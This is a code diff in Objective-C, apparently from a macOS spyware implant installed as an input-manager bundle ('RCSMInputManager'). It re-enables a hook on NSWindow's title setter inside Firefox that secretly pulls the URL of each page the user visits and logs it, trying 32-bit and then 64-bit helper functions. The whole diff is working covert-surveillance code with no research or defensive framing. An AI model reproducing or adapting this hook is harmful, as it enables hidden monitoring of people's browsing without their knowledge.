@@ -610,47 +610,38 @@ void URLStartAgent()
 @end
 
 typedef char* get_url_t(); 
+*/
+
+extern char *get_url32();
+extern char *get_url64();
 
 @implementation NSWindow (firefoxHook)
 
 - (void)setTitleHook:(NSString *)title
 {
-  get_url_t* get_url;
-  
   [self setTitleHook: (title)];
   
+// Disable for 32bit browser
+#ifdef __i386__
+
 #ifdef DEBUG_URL
   infoLog(@"firefox setTitle: '%@'", title);
 #endif
-  
-  void * ffurllib = dlopen("/Library/InputManagers/RCSMInputManager/RCSMInputManager.bundle/Contents/MacOS/libffurl.dylib", RTLD_LAZY);
-  
-  if(ffurllib == 0)
-    {
-#ifdef DEBUG_URL
-      infoLog(@"Cannot loading ffurl.dylib: <%s>", dlerror());
-#endif
-      return;
-    }
-  
-  get_url = (get_url_t*) dlsym(ffurllib, "get_url");
-  
-  if(get_url == 0)
-    {
-#ifdef DEBUG_URL      
-      infoLog(@"Cannot get get_url function");
-#endif      
-      return;
-    }
-  
-  char* ff_url = get_url();
+
+  char* ff_url = get_url32();
 
   if(ff_url == NULL)
     {
-#ifdef DEBUG_URL      
-      infoLog(@"Cannot get _url");
+      // Try to get url on 64bit headers
+      ff_url = get_url64();
+      
+      if (ff_url == NULL) 
+      {
+#ifdef DEBUG_URL     
+        NSLog(@"Cannot get _url");
 #endif      
-      return;
+        return;
+      }
     }
 
 #ifdef DEBUG_URL
@@ -679,8 +670,9 @@ typedef char* get_url_t();
 #endif
   
   [logData release]; 
-  
+
+#endif
 }
 
 @end
-*/
+
